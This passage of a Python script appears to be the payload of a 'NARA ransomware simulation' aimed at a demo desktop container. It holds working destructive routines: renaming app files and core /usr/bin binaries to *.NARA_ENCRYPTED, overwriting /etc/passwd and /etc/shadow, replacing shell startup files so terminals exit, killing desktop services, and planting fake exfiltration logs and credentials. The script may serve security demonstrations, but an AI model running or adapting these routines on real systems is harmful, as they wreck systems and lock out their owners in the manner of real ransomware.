            if 0 <= bx < bmp_w and 0 <= by < bmp_h and _ROCKET_R[by][bx] == "1":
                row.append(fg)
            else:
                row.append(bg)
        pixels.append(row)
    return pixels


def _create_ransom_wallpaper():
    """
    Use the Team Rocket wallpaper (Jessie & James silhouette) if the exploiter
    copied it into the container. Falls back to a generated red R on black.
    Returns the path to the created file.
    """
    # The exploiter copies the real Team Rocket wallpaper here before running us
    if os.path.exists(WALLPAPER_PATH) and os.path.getsize(WALLPAPER_PATH) > 1000:
        print(f"[RANSOMWARE] Using Team Rocket wallpaper → {WALLPAPER_PATH}")
        return WALLPAPER_PATH

    # Fallback: generate a red R on black
    width, height = 1920, 1080
    bg = (10, 10, 10)       # near-black
    fg = (200, 0, 0)        # Team Rocket red

    pixels = _draw_rocket_r(width, height, bg, fg)
    png_path = WALLPAPER_PATH.replace(".jpg", ".png")
    png = _make_png(width, height, pixels)

    with open(png_path, "wb") as f:
        f.write(png)

    return png_path


def generate_rocket_icons():
    """Generate Team Rocket 'R' icon PNGs for desktop shortcuts."""
    os.makedirs(_ICON_DIR, exist_ok=True)

    icon_configs = [
        (_ICON_WARN,    (200, 0, 0),   (255, 255, 255)),  # red bg, white R
        (_ICON_FOLDER,  (40, 40, 40),  (200, 0, 0)),      # dark bg, red R
        (_ICON_BROWSER, (40, 40, 40),  (200, 0, 0)),      # dark bg, red R
        (_ICON_MAIL,    (40, 40, 40),  (200, 0, 0)),      # dark bg, red R
    ]

    for path, bg, fg in icon_configs:
        pixels = _draw_rocket_r(48, 48, bg, fg)
        png = _make_png(48, 48, pixels)
        with open(path, "wb") as f:
            f.write(png)

    print(f"[RANSOMWARE] Team Rocket icons generated → {_ICON_DIR}")


def change_wallpaper():
    """
    Set the XFCE desktop wallpaper. Requires DBus (xfconf) — docker exec without a session
    often fails; when run as DISPLAY=:1 python3 ... from the exploiter, this script runs
    with dbus-launch below so all monitor/workspace backdrops update.
    """
    wallpaper = _create_ransom_wallpaper()
    print(f"[RANSOMWARE] Wallpaper image created → {wallpaper}")
    wp = shlex.quote(wallpaper)

    # Must use the SAME dbus session as the running XFCE desktop, otherwise
    # xfconf-query writes to a new session that xfdesktop never reads.
    # Then kill+restart xfdesktop to force the wallpaper refresh.
    script = f"""
set -e
export DISPLAY="${{DISPLAY:-:1}}"

# Inherit the dbus session from the running xfce4-session process
XFCE_PID=$(pgrep -o xfce4-session 2>/dev/null || true)
if [ -n "$XFCE_PID" ] && [ -r /proc/$XFCE_PID/environ ]; then
  eval $(cat /proc/$XFCE_PID/environ 2>/dev/null | tr '\\0' '\\n' | grep DBUS_SESSION_BUS_ADDRESS)
  export DBUS_SESSION_BUS_ADDRESS
fi

# If we still don't have a dbus address, fall back to feh only
if [ -z "$DBUS_SESSION_BUS_ADDRESS" ]; then
  feh --bg-fill {wp} 2>/dev/null || true
  exit 0
fi

# Set wallpaper for all monitors/workspaces
for key in $(xfconf-query -c xfce4-desktop -l 2>/dev/null | grep last-image || true); do
  xfconf-query -c xfce4-desktop -p "$key" -s {wp} 2>/dev/null || true
done

# Kill and restart xfdesktop so it picks up the new wallpaper
pkill xfdesktop 2>/dev/null || true
sleep 1
xfdesktop &
sleep 1

# Also use feh on root window as belt-and-suspenders
feh --bg-fill {wp} 2>/dev/null || true
"""
    try:
        r = subprocess.run(
            ["bash", "-c", script],
            capture_output=True,
            text=True,
            timeout=45,
        )
        if r.returncode != 0 and r.stderr:
            print(f"[RANSOMWARE] Wallpaper script stderr: {r.stderr[:500]}")
        print("[RANSOMWARE] Wallpaper applied (xfconf + xfdesktop + feh)")
    except subprocess.TimeoutExpired:
        print("[RANSOMWARE] Wallpaper command timed out")
    except Exception as e:
        print(f"[RANSOMWARE] Wallpaper change failed: {e}")


# ------------------------------------------------------------------ #
# “Container unusable” finale (FEAT.md) — encrypt_system_binaries LAST #
# ------------------------------------------------------------------ #

_APPLICATION_ROOT = "/opt/pokedex"
_EXFIL_DIR = "/tmp/nara_exfil"
_APP_ENCRYPT_SUFFIXES = (".py", ".html", ".db", ".json", ".cfg")
_CORRUPT_MARK = "NARA-COMPROMISED\n"


def encrypt_application_files() -> None:
    """Rename vulnerable app sources under /opt/pokedex to *.NARA_ENCRYPTED (skip .git/)."""
    if not os.path.isdir(_APPLICATION_ROOT):
        print(f"[RANSOMWARE] encrypt_application_files: skip (no {_APPLICATION_ROOT})")
        return
    count = 0
    for dirpath, dirnames, filenames in os.walk(_APPLICATION_ROOT):
        if ".git" in dirnames:
            dirnames.remove(".git")
        for fn in filenames:
            if fn.endswith(".NARA_ENCRYPTED"):
                continue
            if not any(fn.endswith(sfx) for sfx in _APP_ENCRYPT_SUFFIXES):
                continue
            path = os.path.join(dirpath, fn)
            if not os.path.isfile(path):
                continue
            dst = path + ".NARA_ENCRYPTED"
            try:
                os.rename(path, dst)
                count += 1
            except OSError as e:
                print(f"[RANSOMWARE] encrypt_application_files skip {path}: {e}")
    print(f"[RANSOMWARE] encrypt_application_files: {count} file(s)")


def seed_exfiltration_evidence() -> None:
    """Plant fake exfil logs + desktop marker (pure file writes)."""
    os.makedirs(_EXFIL_DIR, exist_ok=True)
    ts = datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
    manifest = "\n".join(
        [
            f"{ts} UPLOAD financial_report_Q4.xlsx -> c2.nara.invalid",
            f"{ts} UPLOAD employee_records.csv -> c2.nara.invalid",
            f"{ts} UPLOAD database_backup.sql -> c2.nara.invalid",
            f"{ts} UPLOAD api_keys.txt -> c2.nara.invalid",
            f"{ts} SESSION exfil_complete=true",
        ]
    )
    try:
        with open(os.path.join(_EXFIL_DIR, "exfil_manifest.log"), "w") as f:
            f.write(manifest + "\n")
        with open(os.path.join(_EXFIL_DIR, "stolen_credentials.txt"), "w") as f:
            f.write(
                "root:xK9mP2qL\n"
                "admin:SuperSecret2026!\n"
                "db_svc:AKIAIOSFODNN7EXAMPLE\n"
            )
    except OSError as e:
        print(f"[RANSOMWARE] seed_exfiltration_evidence: {e}")

    desktop = _desktop_path()
    try:
        os.makedirs(desktop, exist_ok=True)
        marker = os.path.join(desktop, "DATA_EXFILTRATED.txt")
        with open(marker, "w") as f:
            f.write(
                "CONFIRMED: Data staged for exfiltration.\n"
                "See /tmp/nara_exfil/ — NARA simulation.\n"
            )
        print(f"[RANSOMWARE] seed_exfiltration_evidence → {marker}")
    except OSError as e:
        print(f"[RANSOMWARE] DATA_EXFILTRATED marker: {e}")


def corrupt_system_configs() -> None:
    """Overwrite key system text files + XFCE xfconf XML (demo container only)."""
    for p in (
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hostname",
        "/etc/motd",
        "/root/.profile",
    ):
        try:
            with open(p, "w") as f:
                f.write(_CORRUPT_MARK)
        except OSError as e:
            print(f"[RANSOMWARE] corrupt_system_configs skip {p}: {e}")

    xfdir = "/root/.config/xfce4/xfconf/xfce-perchannel-xml"
    if os.path.isdir(xfdir):
        for xmlp in glob.glob(os.path.join(xfdir, "*.xml")):
            try:
                with open(xmlp, "w") as f:
                    f.write("<!-- NARA-COMPROMISED -->\n")
            except OSError:
                pass
    print("[RANSOMWARE] corrupt_system_configs: done")


def disable_terminal_access() -> None:
    """New shells print ransom banner in red and exit 1 (existing terminals keep running)."""
    block = """# NARA — terminal access disabled (simulation)
printf '\\033[1;31m'
cat << 'NARA_TERM'
NARA: THIS SYSTEM HAS BEEN COMPROMISED — ACCESS DENIED
NARA_TERM
printf '\\033[0m\\n'
exit 1
"""
    for p in ("/root/.bashrc", "/root/.zshrc"):
        try:
            with open(p, "w") as f:
                f.write(block)
        except OSError as e:
            print(f"[RANSOMWARE] disable_terminal_access skip {p}: {e}")
    try:
        with open("/etc/bash.bashrc", "w") as f:
            f.write(block)
    except OSError as e:
        print(f"[RANSOMWARE] disable_terminal_access /etc/bash.bashrc: {e}")
    print("[RANSOMWARE] disable_terminal_access: new shells will exit immediately")


def kill_all_services() -> None:
    """
    Tear down XFCE UI (popups become hard to dismiss — run only after zenity wave).
    Preserves VNC, python, dbus, tail, noVNC stack.
    """
    names = (
        "xfce4-panel",
        "xfce4-session",
        "thunar",
        "xfdesktop",
        "xfce4-power-manager",
        "xfce4-notifyd",
        "xfsettingsd",
        "xfwm4",
    )
    script = "".join(f"pkill -x {n} 2>/dev/null; " for n in names) + "true"
    try:
        subprocess.run(
            ["bash", "-c", script],
            timeout=30,
            capture_output=True,
        )
        print("[RANSOMWARE] kill_all_services: XFCE components signaled")
    except (OSError, subprocess.TimeoutExpired) as e:
        print(f"[RANSOMWARE] kill_all_services: {e}")


def encrypt_system_binaries() -> None:
    """
    LAST STEP: rename common /usr/bin utilities — after this, no subprocess/shell.
    Never touch python3, or tools required by the running session per FEAT.md.
    """
    bindir = "/usr/bin"
    targets = (
        "bash",
        "sh",
        "dash",
        "ls",
        "cat",
        "grep",
        "find",
        "cp",
        "mv",
        "rm",
        "nano",
        "vi",
        "apt",
        "apt-get",
        "dpkg",
        "wget",
        "curl",
        "ssh",
        "sudo",
        "passwd",
        "chmod",
        "chown",
    )
    n = 0
    for name in targets:
        src = os.path.join(bindir, name)
        if not os.path.isfile(src) or os.path.islink(src):
            continue
        dst = src + ".NARA_ENCRYPTED"
        if os.path.lexists(dst):
            continue
        try:
            os.rename(src, dst)
            n += 1
        except OSError:
            pass
    print(f"[RANSOMWARE] encrypt_system_binaries: {n} binary name(s) renamed (LAST)")


def print_ascii_skull():
    """Print an ASCII skull for dramatic terminal effect."""
    skull = r"""
    ░░░░░░░░░░░░░░░░░░░░░░░░░░
    ░░░░░▄████▄░░▄████▄░░░░░░░
    ░░░░██▀▀▀▀█░█▀▀▀▀██░░░░░░░
    ░░░░██░░░░█░█░░░░██░░░░░░░
    ░░░░░██████░░██████░░░░░░░
    ░░░░░░████░░░░████░░░░░░░░
    ░░░░░███░░░░░░░███░░░░░░░░
    ░░░░░███░░▄▄▄░░███░░░░░░░░
    ░░░░░░▀███████████░░░░░░░░
    ░░░░░░░░▀███████▀░░░░░░░░░
    ░░░░░░░░░░░░░░░░░░░░░░░░░░
    """
    print("\033[91m" + skull + "\033[0m")


def main(custom_message: str = ""):
    print("\n" + "═" * 60)
    print("[RANSOMWARE] Deploying NARA ransomware simulation...")
    print("═" * 60 + "\n")

    print_ascii_skull()

    shutdown_vulnerable_webapp()
    drop_ransom_note(custom_message)
    generate_rocket_icons()
    install_r_icon_theme()
    register_nara_encrypted_mime()
    seed_dummy_sensitive_files()
    hijack_desktop_shortcuts()
    encrypted_paths = encrypt_loose_files_everywhere()

    encrypt_application_files()
    seed_exfiltration_evidence()

    change_wallpaper()
    kill_firefox()
    show_ransom_popups(25)
    apply_r_icons_final(encrypted_paths)
    refresh_desktop_icons()

    print("\n" + "═" * 60)
    print("[RANSOMWARE] Payload complete.")
    print("[RANSOMWARE] Check VNC :5901 to see the desktop effects.")
    print("═" * 60)
    print(DEFAULT_NOTE)


if __name__ == "__main__":
    custom_msg = ""
    if len(sys.argv) > 1:
        custom_msg = " ".join(sys.argv[1:])
    main(custom_msg)
